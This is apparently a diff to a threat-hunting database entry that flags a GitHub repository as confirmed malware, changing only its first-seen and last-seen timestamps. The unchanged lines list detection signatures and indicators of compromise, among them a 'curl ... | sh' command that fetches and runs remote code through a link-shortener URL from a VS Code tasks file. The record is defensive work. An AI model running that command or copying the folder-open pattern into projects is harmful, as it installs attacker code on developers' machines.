@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json', 'eval atob filename:tailwind.config.js'] | Tier-2 confirmed (bash score 9)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/shamratx_ai-banking.json",
     "reviewer_decision": "",
     "notes": ""
@@ -83,7 +83,7 @@
     "evidence_references": "https://github.com/shamratx/ai-banking/blob/5f6737366c7160d3a1c4f2f38d28723d260b7f8a/.vscode/tasks.json\nhttps://github.com/shamratx/ai-banking/blob/5f6737366c7160d3a1c4f2f38d28723d260b7f8a/frontend/tailwind.config.js#L15\nhttps://github.com/shamratx/ai-banking/blob/5f6737366c7160d3a1c4f2f38d28723d260b7f8a/frontend/tailwind.config.js#L22\nhttps://github.com/shamratx/ai-banking/blob/5f6737366c7160d3a1c4f2f38d28723d260b7f8a/frontend/src/utils/decodeJWT.js#L6",
     "verified_iocs": "pesncv.short.gy\nhttps://PEsnCV.short.gy/shMkMn9m\nhttps://PEsnCV.short.gy/shMkMn9l\nhttps://PEsnCV.short.gy/shMkMn9w\ncurl 'https://PEsnCV.short.gy/shMkMn9m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
